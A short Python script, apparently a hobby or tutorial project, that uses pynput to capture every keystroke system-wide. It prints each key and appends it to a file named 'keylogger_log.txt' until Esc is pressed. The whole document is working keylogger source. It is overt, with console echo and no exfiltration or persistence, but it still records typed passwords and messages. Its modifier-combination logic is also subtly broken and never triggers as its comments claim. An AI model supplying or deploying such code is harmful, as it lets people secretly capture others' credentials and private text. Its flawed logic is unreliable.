from pynput.keyboard import Key, Listener

count = 0
keys = []

def on_press(key):
    global count, keys

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    special_keys = ['shift', 'alt', 'ctrl']  # list of special keys

    with open("keylogger_log.txt", "a") as f:
        for i, key in enumerate(keys):
            k = str(key).replace("'", "")

            # Check if key is a special key
            if any(s in k for s in special_keys):

                # Check if the next key in the list is a regular key
                if i < len(keys) - 1 and str(keys[i + 1]).find("Key.") == -1:

                    # Special key was pressed in combination with another key
                    f.write("[{}+{}]".format(k, str(keys[i + 1]).replace("'", "")))

                    # Skip the next key in the list (it has already been written to the file)
                    i += 1

                else:
                    # Special key was pressed by itself
                    f.write("[{}]".format(k))

                continue  # move on to the next key

            if k.find("space") > 0:
                f.write(" ")

            elif k.find("enter") > 0:
                f.write("\n")

            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:
        return False
    else:
        return True


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()